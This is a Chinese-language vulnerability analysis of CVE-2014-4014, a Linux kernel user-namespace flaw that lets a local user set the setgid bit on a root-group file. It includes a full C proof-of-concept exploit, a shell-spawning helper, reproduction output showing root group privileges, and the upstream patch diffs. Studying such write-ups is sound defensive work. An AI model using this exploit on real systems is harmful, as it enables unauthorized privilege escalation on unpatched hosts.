# CVE-2014-4014 漏洞分析
## 漏洞介绍
官方定义如下：

The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are 
inapplicable to inodes, which allows local users to bypass intended chmod restrictions 
by first creating a user namespace, as demonstrated by setting the setgid bit on a file with group ownership of root。

漏洞分类：本地提权漏洞。

## 漏洞复现
### 实验环境
ubuntu 12.04
```
rosanne@rosanne-virtual-machine: uname -a
Linux rosanne-virtual-machine 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686
i386 GNU/Linux
```
### 实验步骤
1、 创建文件flag.txt，文件权限和所属组如下：
```
$ ls -l flag.txt
-rw-r-----  1 test  root  9 Feb 5 09:18 flag.txt
```
以另一个用户账号（rosanne）登录系统，并访问该文件，发现没有访问权限
```
$ cat flag.txt
cat:flag.txt: Permission denied
```
查看当前用户的id，发现rosanne用户并不属于root组，因此没有访问flag.txt的权限
```
$ id
uid=1000(rosanne) gid=1000(rosanne) groups=1000(rosanne),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadm),
124(sambashare)
```
2、创建test.c 文件，并编译得到test应用程序

文件源码如下：
```
include <stdio.h>
int main()
{
    execl("/bin/bash","-sh",0); //加载新的程序替换当前进程，不创建新的进程
    return 0;
}
```
该程序会重新打开一个bash来替换原来的bash。
test 文件的属性如下：
```
$ ls -l test
-rwxrwxr-x 1 rosanne root 7197 Feb 5 09:51 test
```

3、创建漏洞利用文件exploit.c， 编译得到exploit
```
/**
 * CVE-2014-4014 Linux Kernel Local Privilege Escalation PoC
 *
 * Vitaly Nikolenko
 * http://hashcrack.org
 *
 * Usage: ./poc [file_path]
 * 
 * where file_path is the file on which you want to set the sgid bit
 */
#define _GNU_SOURCE
#include <sys/wait.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <string.h>
#include <assert.h>

#define STACK_SIZE (1024 * 1024)
static char child_stack[STACK_SIZE];

struct args {
    int pipe_fd[2];
    char *file_path;
};

static int child(void *arg) {
    struct args *f_args = (struct args *)arg;
    char c;

    // close stdout
    close(f_args->pipe_fd[1]); 

    assert(read(f_args->pipe_fd[0], &c, 1) == 0);

    // set the setgid bit
    chmod(f_args->file_path, S_ISGID|S_IRUSR|S_IWUSR|S_IRGRP|S_IXGRP|S_IXUSR);

    return 0;
}

int main(int argc, char *argv[]) {
    int fd;
    pid_t pid;
    char mapping[1024];
    char map_file[PATH_MAX];
    struct args f_args;

    assert(argc == 2);

    f_args.file_path = argv[1];
    // create a pipe for synching the child and parent
    assert(pipe(f_args.pipe_fd) != -1);

    pid = clone(child, child_stack + STACK_SIZE, CLONE_NEWUSER | SIGCHLD, &f_args);
    assert(pid != -1);

    // get the current uid outside the namespace
    snprintf(mapping, 1024, "0 %d 1\n", getuid()); 

    // update uid and gid maps in the child
    snprintf(map_file, PATH_MAX, "/proc/%ld/uid_map", (long) pid);
    fd = open(map_file, O_RDWR); assert(fd != -1);

    assert(write(fd, mapping, strlen(mapping)) == strlen(mapping));
    close(f_args.pipe_fd[1]);

    assert (waitpid(pid, NULL, 0) != -1);
}
```
4、运行exploit
```
$ exploit ./test
```
再次查看test文件的属性
```
$ ls -l test
-rwxr-s--- 1 rosanne root 7197 Feb S 09:46 test
```
此时test的sgid已经被设置。

5、运行test，并再次访问flag.txt
```
rosanne@rosanne-virtual-machine: ./test
-sh-4.2$ id
uid=1000(rosanne) gid=1000(rosanne) egid=0(root) groups=1000(rosanne) ...
-sh-4.2$ cat flag.txt
w00tw00t
```
由于test的sgid位被设置，当test运行并打开一个新的bash时，该bash的egid也为0，此时可以访问flag.txt。

## 漏洞分析
用户名称空间在Linux 2.6.23版本中被引入，最终完成于Linux3.8（从3.8开始，非特权进程也可以创建用户名称空间）。
问题就在于错误的使用inode_capable()来决定用户或组的功能。

## 漏洞修复
完整patch内容参见CVE-2014-4014.patch

核心内容为两处：

1、 修改inode_owner_or_capable 函数
```
diff --git a/fs/inode.c b/fs/inode.c
index 2feb9b6..6eecb7f 100644
--- a/fs/inode.c
+++ b/fs/inode.c
@@ -1839,14 +1839,18 @@ EXPORT_SYMBOL(inode_init_owner);
  * inode_owner_or_capable - check current task permissions to inode
  * @inode: inode being checked
  *
- * Return true if current either has CAP_FOWNER to the inode, or
- * owns the file.
+ * Return true if current either has CAP_FOWNER in a namespace with the
+ * inode owner uid mapped, or owns the file.
  */
 bool inode_owner_or_capable(const struct inode *inode)
 {
+	struct user_namespace *ns;
+
 	if (uid_eq(current_fsuid(), inode->i_uid))
 		return true;
-	if (inode_capable(inode, CAP_FOWNER))
+
+	ns = current_user_ns();
+	if (ns_capable(ns, CAP_FOWNER) && kuid_has_mapping(ns, inode->i_uid))
 		return true;
 	return false;
 }
```

2、修改 inode_capable 函数

```
diff --git a/kernel/capability.c b/kernel/capability.c
index 84b2bbf..a5cf13c 100644
--- a/kernel/capability.c
+++ b/kernel/capability.c
@@ -424,23 +424,19 @@ bool capable(int cap)
 EXPORT_SYMBOL(capable);
 
 /**
- * inode_capable - Check superior capability over inode
+ * capable_wrt_inode_uidgid - Check nsown_capable and uid and gid mapped
  * @inode: The inode in question
  * @cap: The capability in question
  *
- * Return true if the current task has the given superior capability
- * targeted at it's own user namespace and that the given inode is owned
- * by the current user namespace or a child namespace.
- *
- * Currently we check to see if an inode is owned by the current
- * user namespace by seeing if the inode's owner maps into the
- * current user namespace.
- *
+ * Return true if the current task has the given capability targeted at
+ * its own user namespace and that the given inode's uid and gid are
+ * mapped into the current user namespace.
  */
-bool inode_capable(const struct inode *inode, int cap)
+bool capable_wrt_inode_uidgid(const struct inode *inode, int cap)
 {
 	struct user_namespace *ns = current_user_ns();
 
-	return ns_capable(ns, cap) && kuid_has_mapping(ns, inode->i_uid);
+	return ns_capable(ns, cap) && kuid_has_mapping(ns, inode->i_uid) &&
+		kgid_has_mapping(ns, inode->i_gid);
 }
-EXPORT_SYMBOL(inode_capable);
+EXPORT_SYMBOL(capable_wrt_inode_uidgid);
-- 
```
